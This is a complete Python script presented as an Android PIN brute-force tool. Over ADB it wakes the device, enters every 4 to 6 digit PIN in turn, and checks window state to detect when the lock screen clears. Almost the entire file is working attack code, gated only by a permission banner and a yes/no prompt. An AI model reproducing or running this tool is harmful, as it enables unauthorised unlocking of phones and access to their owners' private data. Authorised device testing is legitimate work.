#!/usr/bin/env python3
"""
Android PIN Brute Force Tool
Simple security testing tool for Android devices
"""
import subprocess
import time
import sys
import os
from itertools import product
import signal

class AndroidBruteForce:
    def __init__(self):
        self.device_connected = False
        self.delay = 2
        self.current_attempt = 0
        self.found_password = None
        
    def check_adb_connection(self):
        """Check if Android device is connected"""
        try:
            result = subprocess.run(['adb', 'devices'], 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=5)
            
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                for line in lines[1:]:
                    if 'device' in line and 'offline' not in line:
                        self.device_connected = True
                        print("[+] Device connected")
                        return True
            
            print("[-] No device found")
            return False
            
        except FileNotFoundError:
            print("[-] ADB not found. Install: sudo apt-get install adb")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def unlock_screen(self):
        """Unlock the screen"""
        try:
            subprocess.run(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_WAKEUP'], 
                         capture_output=True, timeout=2)
            time.sleep(0.5)
            subprocess.run(['adb', 'shell', 'input', 'swipe', '300', '1000', '300', '300'], 
                         capture_output=True, timeout=2)
            time.sleep(0.5)
            return True
        except:
            return False
    
    def input_password(self, password):
        """Input password on device"""
        try:
            # Clear existing input
            subprocess.run(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_CLEAR'], 
                         capture_output=True, timeout=2)
            time.sleep(0.2)
            
            # Input each digit
            for char in str(password):
                subprocess.run(['adb', 'shell', 'input', 'keyevent', f'KEYCODE_{char}'], 
                             capture_output=True, timeout=1)
                time.sleep(0.1)
            
            # Submit
            subprocess.run(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_ENTER'], 
                         capture_output=True, timeout=1)
            return True
        except:
            return False
    
    def check_screen_locked(self):
        """Check if screen is still locked"""
        try:
            result = subprocess.run(['adb', 'shell', 'dumpsys', 'window', 'windows'], 
                                  capture_output=True, text=True, timeout=3)
            return 'Keyguard' in result.stdout or 'LockScreen' in result.stdout
        except:
            return True
    
    def try_password(self, password):
        """Try a single password"""
        print(f"[*] Trying: {password}", end='\r')
        sys.stdout.flush()
        
        if not self.unlock_screen():
            return False
        
        if not self.input_password(password):
            return False
        
        time.sleep(1)
        
        if not self.check_screen_locked():
            self.found_password = password
            print(f"\n[+] Found: {password}")
            return True
        
        return False
    
    def brute_force(self, length=4):
        """Brute force PIN of given length"""
        total = 10 ** length
        print(f"[+] Testing {length}-digit PIN (Total: {total})")
        
        for i in range(total):
            password = str(i).zfill(length)
            self.current_attempt += 1
            
            # Show progress
            if self.current_attempt % 100 == 0:
                progress = (self.current_attempt / total) * 100
                print(f"[*] Progress: {progress:.1f}% ({self.current_attempt}/{total})")
            
            if self.try_password(password):
                return password
            
            time.sleep(self.delay)
        
        return None
    
    def cleanup(self):
        """Clean up after testing"""
        try:
            subprocess.run(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_POWER'], 
                         capture_output=True, timeout=2)
        except:
            pass

def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    print("\n[!] Stopped by user")
    sys.exit(0)

def main():
    print("=" * 50)
    print("Android PIN Brute Force Tool")
    print("=" * 50)
    print("\n[!] Only use on devices you own or have permission to test\n")
    
    # Confirm
    confirm = input("Do you have permission? (y/N): ").lower()
    if confirm != 'y':
        print("Exiting...")
        sys.exit(1)
    
    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Initialize
    bf = AndroidBruteForce()
    
    # Check connection
    print("\n[*] Checking connection...")
    if not bf.check_adb_connection():
        print("\n[*] Troubleshooting:")
        print("  1. Enable USB debugging on Android")
        print("  2. Connect device via USB")
        print("  3. Run: adb devices")
        sys.exit(1)
    
    # Get parameters
    while True:
        try:
            length = int(input("\n[?] PIN length (4-6): "))
            if 4 <= length <= 6:
                break
            print("[-] Enter 4, 5, or 6")
        except ValueError:
            print("[-] Enter a number")
    
    try:
        delay = float(input("[?] Delay in seconds (1-5): "))
        if 1 <= delay <= 5:
            bf.delay = delay
    except:
        print("[*] Using default delay: 2 seconds")
    
    # Start brute force
    print("\n[*] Starting... Press Ctrl+C to stop\n")
    start = time.time()
    
    result = bf.brute_force(length)
    
    elapsed = time.time() - start
    
    # Results
    print("\n" + "=" * 50)
    print("RESULTS")
    print("=" * 50)
    
    if result:
        print(f"[+] Password: {result}")
        print(f"[+] Attempts: {bf.current_attempt}")
        print(f"[+] Time: {elapsed:.1f} seconds")
    else:
        print("[-] Password not found")
        print(f"[+] Attempts: {bf.current_attempt}")
    
    bf.cleanup()
    print("\n[+] Done")

if __name__ == "__main__":
    main()